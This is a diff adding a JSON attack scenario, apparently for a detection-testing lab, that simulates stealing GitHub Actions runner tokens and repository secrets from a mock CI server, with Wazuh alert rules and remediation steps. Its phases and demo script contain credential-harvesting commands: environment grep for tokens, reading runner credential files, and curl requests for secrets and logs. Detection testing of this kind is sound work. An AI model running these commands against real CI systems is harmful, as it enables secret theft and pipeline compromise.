@@ -1,0 +1,177 @@
+{
+  "id": "S3-01",
+  "name": "Stolen GitHub Actions Runner Token",
+  "category": "CI/CD Pipeline",
+  "version": "1.0",
+  "description": "Steal GitHub Actions runner registration token to compromise CI/CD pipeline",
+  "difficulty": "Medium",
+  "real_world_relevance": "GitHub Actions compromises, CI/CD supply chain attacks",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Execution"],
+    "techniques": [
+      {"id": "T1528", "name": "Steal Application Access Token"},
+      {"id": "T1059", "name": "Command and Scripting Interpreter"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-cicd"],
+    "network": "cicd_net"
+  },
+
+  "attack_flow": {
+    "description": "Attacker steals GitHub Actions runner token to execute malicious workflows",
+    "diagram": [
+      "1. Attacker compromises CI/CD runner or gains workflow execution",
+      "2. Attacker accesses GITHUB_TOKEN or ACTIONS_RUNTIME_TOKEN",
+      "3. Attacker uses token to query GitHub API",
+      "4. Attacker modifies repository or exfiltrates secrets",
+      "5. Attacker achieves persistence via workflow modification"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Token Discovery",
+      "description": "Find GitHub Actions tokens in environment",
+      "actions": [
+        {
+          "type": "command",
+          "command": "env | grep -E '(GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN|RUNNER_TOKEN)'",
+          "expected_output_contains": ["GITHUB_TOKEN", "ghs_"]
+        },
+        {
+          "type": "command",
+          "command": "cat /runner/.credentials 2>/dev/null",
+          "description": "Check for stored runner credentials"
+        }
+      ]
+    },
+    {
+      "name": "Token Theft via API",
+      "description": "Obtain runner registration token from CI/CD server",
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.42.0.100:8080/github/actions/runner/token",
+          "method": "POST",
+          "expected_response_contains": ["token", "expires_at"]
+        }
+      ]
+    },
+    {
+      "name": "Repository Access",
+      "description": "Use stolen token to access repository secrets",
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.42.0.100:8080/github/repos/demo/test/actions/secrets",
+          "method": "GET",
+          "expected_response_contains": ["AWS_ACCESS_KEY_ID", "DEPLOY_TOKEN"]
+        }
+      ]
+    },
+    {
+      "name": "Workflow Log Access",
+      "description": "Access workflow logs that may contain leaked secrets",
+      "critical": true,
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.42.0.100:8080/github/repos/demo/test/actions/runs/123/logs",
+          "method": "GET",
+          "expected_response_contains": ["AWS_ACCESS_KEY_ID=AKIA", "DEBUG:"]
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "Process",
+      "description": "Environment variable enumeration for CI tokens",
+      "wazuh_rule": "100800"
+    },
+    {
+      "type": "Network",
+      "description": "Requests to GitHub API from CI runner",
+      "wazuh_rule": "100801"
+    },
+    {
+      "type": "Network",
+      "description": "Access to workflow logs or secrets endpoints",
+      "wazuh_rule": "100802"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100800",
+      "level": 8,
+      "description": "NHI: CI/CD token enumeration detected"
+    },
+    {
+      "rule_id": "100801",
+      "level": 10,
+      "description": "NHI: GitHub API access from CI runner"
+    },
+    {
+      "rule_id": "100802",
+      "level": 12,
+      "description": "NHI: CI/CD secrets or logs access - POTENTIAL THEFT"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Rotate all repository secrets",
+      "Revoke compromised runner tokens",
+      "Review workflow run history for malicious executions"
+    ],
+    "long_term": [
+      "Use OIDC tokens instead of long-lived secrets",
+      "Implement workflow approval requirements",
+      "Restrict runner token permissions",
+      "Enable GitHub Advanced Security"
+    ],
+    "github_settings": [
+      "# Required workflow approvals",
+      "Settings -> Actions -> General -> 'Require approval for all outside collaborators'",
+      "",
+      "# Restrict GITHUB_TOKEN permissions",
+      "permissions:",
+      "  contents: read",
+      "  packages: none"
+    ]
+  },
+
+  "demo_script": {
+    "container": "cicd-runner",
+    "commands": [
+      "# Find GitHub tokens in environment",
+      "env | grep GITHUB",
+      "",
+      "# Request runner token from mock server",
+      "curl -X POST http://mock-cicd:8080/github/actions/runner/token",
+      "",
+      "# Access repository secrets list",
+      "curl http://mock-cicd:8080/github/repos/demo/test/actions/secrets"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "GitHub Actions Security Hardening",
+      "url": "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+    },
+    {
+      "title": "GITHUB_TOKEN Permissions",
+      "url": "https://docs.github.com/en/actions/security-guides/automatic-token-authentication"
+    },
+    {
+      "title": "MITRE ATT&CK T1528",
+      "url": "https://attack.mitre.org/techniques/T1528/"
+    }
+  ]
+}
